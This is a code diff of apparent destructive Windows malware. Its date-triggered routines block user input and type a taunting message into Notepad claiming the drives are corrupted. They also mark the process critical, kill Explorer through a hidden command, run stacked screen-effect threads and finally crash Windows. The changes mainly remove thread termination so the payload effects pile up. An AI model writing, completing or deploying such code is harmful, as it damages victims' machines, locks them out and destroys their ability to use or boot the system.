@@ -80,15 +80,17 @@ void March13() {
 		notepad_handle = FindWindow(L"Notepad", NULL);
 		Sleep(1000);
 	}
+	SetForegroundWindow(notepad_handle);
+	SetForegroundWindow(notepad_handle);
+	SetForegroundWindow(notepad_handle);
 	// Resize the Notepad window
 	SetWindowPos(notepad_handle, NULL, 0, 0, 800, 600, SWP_NOMOVE);
 	BlockInput(true);
 
 	// Wait for the Notepad window to resize
 	Sleep(1000);
-
-	// Set the text to type
 	SetForegroundWindow(notepad_handle);
+	// Set the text to type
 	const char* text = "Seems like your bad dream comes true, Friend!.. After Your Computer couldn't withstand\nthe flaming hell unleashed upon it!, you find yourself no longer able to boot into windows,\n What you just withnessed is just a part of a destruction!.., All your drives have been corrupted!..,\nbut you won't complain right? Would you? But you choosed it yourself!.., And this is not my fault. \nNow as I'm ending this computer I'm wishing you good luck! friend!....Bye! \nenjoy the hell unleashed upon your\n computer.";
 
 	// Loop through the text and type each character
@@ -112,18 +114,14 @@ void March13() {
 	}
 	BlockInput(false);
 	clean();
-	HANDLE coloursthread = CreateThread(0, 0, colours, 0, 0, 0);
+	CreateThread(0, 0, colours, 0, 0, 0);
 	Sleep(20000);
-	TerminateThread(coloursthread, 0);
-	HANDLE Amazingthread = CreateThread(0, 0, Amazing, 0, 0, 0);
+	CreateThread(0, 0, Amazing, 0, 0, 0);
 	Sleep(20000);
-	TerminateThread(Amazingthread, 0);
-	HANDLE darkthread = CreateThread(0, 0, dark, 0, 0, 0);
+	CreateThread(0, 0, dark, 0, 0, 0);
 	Sleep(30000);
-	TerminateThread(darkthread, 0);
-	HANDLE effecthread = CreateThread(0, 0, effect, 0, 0, 0);
+	CreateThread(0, 0, effect, 0, 0, 0);
 	Sleep(30000);
-	TerminateThread(effecthread, 0);
 	CrashWindows();
 
 }
@@ -340,9 +338,8 @@ void January9() {
 	clean();
 	ShellExecuteA(NULL, NULL, "cmd /c taskkill /f /im explorer.exe && explorer", NULL, NULL, SW_HIDE);
 	Sleep(1000);
-	HANDLE onceinabluemooneffecthread = CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
+	CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
 	Sleep(90000);
-	TerminateThread(onceinabluemooneffecthread, 0);
 	CreateThread(0, 0, dark, 0, 0, 0);
 	Sleep(30000);
 	CrashWindows();
@@ -366,21 +363,18 @@ void march4() {
 //all payloads combined slowly!
 void December24() {
 	SetCriticalProcess();
-	HANDLE coloursthread = CreateThread(0, 0, colours, 0, 0, 0);
+	CreateThread(0, 0, colours, 0, 0, 0);
 	Sleep(20000);
-	TerminateThread(coloursthread, 0);
 	HANDLE Amazingthread = CreateThread(0, 0, Amazing, 0, 0, 0);
 	Sleep(20000);
 	TerminateThread(Amazingthread, 0);
-	HANDLE darkthread = CreateThread(0, 0, dark, 0, 0, 0);
+	CreateThread(0, 0, dark, 0, 0, 0);
 	Sleep(30000);
-	TerminateThread(darkthread, 0);
 	HANDLE effecthread = CreateThread(0, 0, effect, 0, 0, 0);
 	Sleep(30000);
 	TerminateThread(effecthread, 0);
-	HANDLE onceinabluemooneffecthread = CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
+	CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
 	Sleep(90000);
-	TerminateThread(onceinabluemooneffecthread, 0);
 	HANDLE hide1 = CreateThread(0, 0, hide, 0, 0, 0);
 	Sleep(30000);
 	TerminateThread(hide1, 0);
@@ -430,9 +424,8 @@ void January24() {
 	HANDLE exteremethread = CreateThread(0, 0, extreme, 0, 0, 0);
 	Sleep(60000);
 	TerminateThread(exteremethread, 0);
-	HANDLE onceinabluemooneffecthread = CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
+	CreateThread(0, 0, onceinabluemooneffect, 0, 0, 0);
 	Sleep(90000);
-	TerminateThread(onceinabluemooneffecthread, 0);
 	WCHAR SystemDirectory[MAX_PATH] = { 0 };
 	GetSystemDirectory(SystemDirectory, MAX_PATH);
 
